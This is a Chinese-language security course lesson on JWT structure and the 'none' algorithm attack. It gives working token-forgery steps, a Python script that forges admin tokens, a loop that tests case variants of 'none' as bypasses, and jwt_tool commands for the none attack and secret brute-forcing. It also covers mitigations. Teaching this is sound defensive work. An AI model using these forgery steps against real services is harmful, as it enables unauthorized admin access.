---
title: Day047：JWT 攻击 - 原理与 none 算法漏洞
tags:
  - 网络安全
  - JWT
  - 认证绕过
categories:
  - 90天安全突击
stage: 攻坚
abbrlink: d047
date: 2026-03-10
updated: 2026-01-28
---

# Day047：JWT 攻击 - 原理与 none 算法漏洞

## 基本信息

| 项目 | 内容 |
|------|------|
| **所属阶段** | 攻坚（第二阶段） |
| **所属周次** | Week 8：认证与逻辑漏洞 |
| **今日主题** | JWT 结构与 none 算法攻击 |
| **预计时间** | 3 小时 |
| **难度等级** | 进阶 |

---

## 今日痛点场景

> **场景**：你抓到一个请求，Authorization 头里是一长串看起来像乱码的东西。但仔细看，它由三段组成，中间用点分隔。
>
> **问题**：这是什么？能不能伪造？
>
> **今天的任务**：学习 JWT（JSON Web Token）——现代 Web 应用最流行的认证方式，以及如何攻击它。

---

## 今日目标

- [ ] 理解 JWT 的结构和工作原理
- [ ] 掌握 JWT none 算法攻击
- [ ] 学会解析和修改 JWT
- [ ] 完成 JWT 伪造实战

**闯关条件**：成功利用 none 算法伪造 JWT 提升权限。

---

## 实战任务（先动手！）

### 任务 1：理解 JWT 结构（25 分钟）

**JWT 的组成**：
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.
SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

三部分，用 . 分隔：
1. Header（头部）
2. Payload（载荷）
3. Signature（签名）
```

**解码 JWT**：
```bash
# Header（Base64 解码）
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d
# 结果：{"alg":"HS256","typ":"JWT"}

# Payload（Base64 解码）
echo "eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ" | base64 -d
# 结果：{"sub":"1234567890","name":"John Doe","iat":1516239022}
```

**在线工具**：https://jwt.io

**Header 字段**：
```json
{
  "alg": "HS256",  // 签名算法
  "typ": "JWT"    // 类型
}
```

**Payload 常见字段**：
```json
{
  "sub": "1234567890",   // 主题（用户ID）
  "name": "John Doe",    // 用户名
  "iat": 1516239022,     // 签发时间
  "exp": 1516242622,     // 过期时间
  "role": "user"         // 角色（自定义）
}
```

**记录**：
```
JWT 三部分：________________
你解码的 JWT 内容：________________
```

---

### 任务 2：JWT 签名验证原理（20 分钟）

**签名过程**：
```
Signature = HMAC-SHA256(
    base64UrlEncode(header) + "." + base64UrlEncode(payload),
    secret
)
```

**验证过程**：
```
1. 服务器收到 JWT
2. 取出 Header 和 Payload
3. 用服务器的 secret 重新计算签名
4. 对比计算结果和 JWT 中的签名
5. 一致则验证通过
```

**常见算法**：
| 算法 | 类型 | 说明 |
|------|------|------|
| HS256 | 对称加密 | 使用同一个 secret |
| RS256 | 非对称加密 | 使用公私钥对 |
| none | 无签名 | 不验证签名（危险！） |

**记录**：
```
签名的作用：________________
```

---

### 任务 3：none 算法攻击（45 分钟）

**漏洞原理**：
```
JWT 规范允许 "alg": "none"，表示不需要签名。
如果服务器接受 none 算法，攻击者可以伪造任意 JWT！
```

**攻击步骤**：

**步骤 1：获取正常 JWT**
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
eyJzdWIiOiIxMjM0IiwibmFtZSI6InVzZXIiLCJyb2xlIjoidXNlciJ9.
xxxxx
```

**步骤 2：修改 Header**
```json
// 原始
{"alg":"HS256","typ":"JWT"}

// 修改为
{"alg":"none","typ":"JWT"}
```

**步骤 3：修改 Payload**
```json
// 原始
{"sub":"1234","name":"user","role":"user"}

// 修改为
{"sub":"1234","name":"admin","role":"admin"}
```

**步骤 4：重新编码**
```bash
# Header
echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '/+' '_-'
# 结果：eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0

# Payload
echo -n '{"sub":"1234","name":"admin","role":"admin"}' | base64 | tr -d '=' | tr '/+' '_-'
# 结果：eyJzdWIiOiIxMjM0IiwibmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0
```

**步骤 5：构造最终 JWT**
```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0IiwibmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.

注意：最后的签名部分为空，但保留点号！
```

**Python 脚本**：
```python
import base64
import json

def create_none_jwt(payload):
    header = {"alg": "none", "typ": "JWT"}

    def b64_encode(data):
        return base64.urlsafe_b64encode(
            json.dumps(data).encode()
        ).rstrip(b'=').decode()

    return f"{b64_encode(header)}.{b64_encode(payload)}."

# 使用
payload = {"sub": "1234", "name": "admin", "role": "admin"}
jwt = create_none_jwt(payload)
print(jwt)
```

**记录**：
```
构造的 none 算法 JWT：________________
攻击是否成功：________________
```

---

### 任务 4：none 算法变形绕过（30 分钟）

**服务器可能的检查方式**：
```python
# 简单检查（可绕过）
if header['alg'] == 'none':
    reject()

# 正确检查
if header['alg'].lower() in ['none', '']:
    reject()
```

**绕过技巧**：

**技巧 1：大小写变换**
```json
{"alg":"None"}
{"alg":"NONE"}
{"alg":"nOnE"}
```

**技巧 2：空格和特殊字符**
```json
{"alg":"none "}
{"alg":" none"}
{"alg":"none\n"}
```

**技巧 3：空字符串**
```json
{"alg":""}
```

**实战测试**：
```python
variations = [
    'none', 'None', 'NONE', 'nOnE',
    'none ', ' none', 'none\n', 'none\t',
    ''
]

for alg in variations:
    jwt = create_jwt_with_alg(alg, payload)
    response = send_request(jwt)
    if response.status_code == 200:
        print(f"[+] Bypass with: {repr(alg)}")
```

**记录**：
```
尝试的变形：________________
成功绕过的变形：________________
```

---

### 任务 5：JWT 攻击工具使用（30 分钟）

**工具 1：jwt_tool**

```bash
# 安装
git clone https://github.com/ticarpi/jwt_tool
cd jwt_tool
pip install -r requirements.txt

# 解析 JWT
python jwt_tool.py <your_jwt>

# none 算法攻击
python jwt_tool.py <your_jwt> -X a

# 修改 Payload
python jwt_tool.py <your_jwt> -T

# 暴力破解密钥
python jwt_tool.py <your_jwt> -C -d wordlist.txt
```

**工具 2：Burp Suite JWT Editor**

1. 安装 JWT Editor 插件
2. 捕获包含 JWT 的请求
3. 右键 → Send to JWT Editor
4. 修改 Header 和 Payload
5. 选择攻击方式
6. 发送请求

**在线工具**：
- https://jwt.io - 解码和验证
- https://token.dev - JWT 分析

**记录**：
```
使用的工具：________________
工具功能：________________
```

---

## 今日闯关检查

| 检查项 | 分数 |
|--------|------|
| 理解 JWT 结构 | 20 分 |
| 成功解码 JWT | 15 分 |
| 成功构造 none 算法 JWT | 30 分 |
| 掌握绕过技巧 | 20 分 |
| 使用 JWT 工具 | 15 分 |

**60 分及格，80 分优秀，100 分满分**

你的得分：____

---

## 底层补课

### JWT vs Session

| 对比项 | JWT | Session |
|--------|-----|---------|
| 存储位置 | 客户端 | 服务器 |
| 状态 | 无状态 | 有状态 |
| 扩展性 | 好（无需共享存储） | 需要 Session 共享 |
| 安全性 | 依赖签名 | 依赖 Session ID |
| 撤销 | 困难 | 简单 |

### 为什么 none 算法存在？

```
历史原因：
- JWT 规范（RFC 7519）定义了 none 算法
- 用于内部系统或已有其他安全层的场景
- 实际生产环境几乎不应该使用

安全问题：
- 很多 JWT 库默认接受 none
- 开发者不了解风险
- 缺乏安全配置
```

### 安全的 JWT 验证

```python
# 不安全的实现
def verify_jwt(token):
    header = decode_header(token)
    alg = header.get('alg')
    # 直接使用 header 中指定的算法
    return jwt.decode(token, secret, algorithms=[alg])

# 安全的实现
ALLOWED_ALGORITHMS = ['HS256', 'RS256']

def verify_jwt(token):
    # 强制指定允许的算法
    return jwt.decode(token, secret, algorithms=ALLOWED_ALGORITHMS)
```

---

## 避坑指南

| 坑点 | 症状 | 解决方案 |
|------|------|----------|
| Base64 填充 | 解码失败 | 使用 base64url 而非标准 base64 |
| 签名部分 | 忘记保留点号 | JWT 必须是三段，最后可以为空 |
| 大小写敏感 | none 不生效 | 尝试各种大小写组合 |
| 服务器缓存 | 修改后无效 | 使用新的 Session 测试 |

---

## 知识卡片速查

### JWT 结构速记

```
Header.Payload.Signature
  ↓        ↓        ↓
算法/类型  用户信息   签名

Base64URL(Header) + "." + Base64URL(Payload) + "." + Signature
```

### none 算法攻击速查

```bash
# 1. 解码原始 JWT
python jwt_tool.py $JWT

# 2. 构造 none 算法 JWT
python jwt_tool.py $JWT -X a

# 3. 或手动构造
# Header: {"alg":"none","typ":"JWT"}
# Payload: 修改后的数据
# Signature: 空
# 格式: header.payload.
```

### 常见 Payload 字段

```json
{
  "sub": "用户ID",
  "name": "用户名",
  "role": "角色",
  "admin": "是否管理员",
  "iat": "签发时间",
  "exp": "过期时间",
  "iss": "签发者",
  "aud": "接收者"
}
```

---

## 常见问题

**Q1：JWT 泄露了怎么办？**

A1：
- JWT 无法主动撤销（无状态）
- 解决方案：设置短过期时间、使用 Token 黑名单、强制用户重新登录

**Q2：none 算法漏洞还常见吗？**

A2：
- 主流 JWT 库已修复
- 但仍存在于：老旧系统、自己实现的 JWT 验证、配置不当

**Q3：如何判断服务器使用的算法？**

A3：
1. 解码 JWT 的 Header
2. 查看 "alg" 字段
3. 尝试修改测试服务器行为

---

## 明日预告

**Day 048：JWT 攻击 - 弱密钥破解与算法混淆**

明天你将：
- 学习 JWT 弱密钥暴力破解
- 掌握 RS256 to HS256 算法混淆攻击
- 深入 JWT 高级利用技巧

---

## 学习记录

| 项目 | 内容 |
|------|------|
| 实际学习日期 | |
| 成功伪造的 JWT | |
| 使用的攻击技术 | |
| 今日收获 | |

---

> **导师点评**：
>
> JWT 被设计成"无状态"——服务器不需要存储 Session，靠签名保证安全。
>
> 但这也意味着：**如果签名被绕过，整个认证体系就崩了**。
>
> none 算法攻击是最简单的 JWT 攻击之一。它告诉我们一个道理：**规范中存在的功能，不代表你应该使用它**。
>
> 很多安全问题不是"代码有 Bug"，而是"功能太多太灵活"导致的配置错误。

```bash
echo "Day 047 Complete! JWT 黑客入门！"
```
